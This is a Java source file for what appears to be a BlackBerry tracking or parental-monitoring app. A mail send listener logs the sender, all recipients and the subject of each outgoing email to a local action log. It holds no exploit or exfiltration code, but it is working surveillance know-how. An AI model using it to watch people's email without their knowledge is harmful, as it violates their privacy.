package com.spotlight.track;

import com.kids.prototypes.Debug;
import com.kids.prototypes.LocalDataReader;
import com.kids.prototypes.LocalDataWriter;

import net.rim.blackberry.api.mail.Store;
import net.rim.blackberry.api.mail.Address;
import net.rim.blackberry.api.mail.Session;
import net.rim.blackberry.api.mail.SendListener;
import net.rim.blackberry.api.mail.MessagingException;
import net.rim.blackberry.api.mail.NoSuchServiceException;


/**
 * 
 * MyMailListener monitors and registers e-mail based events.
 *
 */
public class MyMailListener implements SendListener
{
	private LocalDataReader actLog;
	Debug log = Logger.getInstance();

/**
 * The constructor initialises the action store location 
 * and registers a SendListener for the device.
 * 
 * @param inputAccess log of actions
 */
	public MyMailListener(LocalDataReader inputAccess)
	{
		log.log("MyMailListener begin...");
		actLog = inputAccess;
		//MailSendListener mailSL = new mailSendListener();

		try
		{
			Store mailStore = Session.waitForDefaultSession().getStore();
			mailStore.addSendListener(this);
		}
		catch(NoSuchServiceException e) 
		{actLog.addMessage(true,action.TYPE_MAIL,e.toString());}
		catch(Exception e) 
		{actLog.addMessage(true,action.TYPE_MAIL,e.toString());}
	}

/**
 * Retrieves and formats e-mail data and adds it to the action log
 * 
 * @param arg0 device e-mail data
 * @return boolean error value
 */
	
	
	public boolean sendMessage(net.rim.blackberry.api.mail.Message arg0) 
	{
		StringBuffer DestinationAddress = new StringBuffer();
		
		try
		{
			DestinationAddress.append(arg0.getFolder().getStore().getServiceConfiguration().getEmailAddress());
			
			Address DestinationAddressArray[] = arg0.getRecipients(arg0.getMessageType());
			
			for(int count = 0; count<DestinationAddressArray.length; count++)
			{	//Format e-mail addresses: place comma between each address
				DestinationAddress.append(", ");
				DestinationAddress.append(DestinationAddressArray[count].getAddr());
			}
		} 
		catch (MessagingException e)
		{actLog.addMessage(true,action.TYPE_MAIL,e.toString());}
		catch (Exception e)
		{actLog.addMessage(true,action.TYPE_MAIL,e.toString());}

		actLog.addMessage(action.TYPE_MAIL, arg0.getSubject(),
						DestinationAddress.toString());//Integer.toString(arg0.getStatus())
	
		return false;
	}
}
